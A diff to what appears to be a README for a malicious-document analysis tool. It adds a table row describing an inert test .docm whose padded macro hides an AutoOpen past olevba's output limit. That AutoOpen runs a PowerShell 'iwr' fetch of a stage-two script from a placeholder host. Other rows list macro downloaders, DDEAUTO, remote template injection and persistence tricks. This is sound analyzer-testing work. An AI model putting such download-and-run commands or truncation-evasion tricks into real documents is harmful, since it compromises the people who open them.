@@ -70,6 +70,7 @@ To edit it: `python scripts/samplegen.py --unpack`, change `scripts/make_samples
 | File | What you should see |
 |---|---|
 | `word/sample.docm` | *Factura 2026-0187*. VBA downloader (`AutoOpen`/`Document_Open`, `URLDownloadToFileA` declare, hex-decoded URL, `WScript.Shell.Run`), Base64 PowerShell stored in a **document variable**, a **DDEAUTO** field, custom properties, rsids. ViperMonkey emulates the download and the commands. |
+| `word/sample_long_macro.docm` | *Factura 2026-0187* with a macro padded with 900 harmless routines (one invoice line each), so **olevba prints ~140,000 characters**, more than the 60,000 a module result keeps; the `AutoOpen` that runs `powershell … iwr https://billing-portal.example/long/late_stage.ps1` sits at the **end**, past that cut. Expected: the **oletools** tab says the output is cut; **Reports → Markdown → Tool outputs** has olevba's whole output (the URL included), and **Download with every output (.zip)** holds it as `tool_output/olevba….txt`. Inert. |
 | `word/sample.docx` | Commercial proposal with **remote template injection** (`attachedTemplate` → `198.51.100.23`) and an `INCLUDEPICTURE` tracking image. No macros. |
 | `word/sample.dotx` / `word/sample.dotm` | Corporate template with a tracking image / a **global template** with `AutoExec` persistence (copies itself to Word STARTUP) and `AutoNew`, plus a remote template. |
 | `excel/sample.xlsx` | Invoice sheet with `WEBSERVICE` / `FILTERXML` formulas and a **hidden** sheet holding the "new IBAN". |
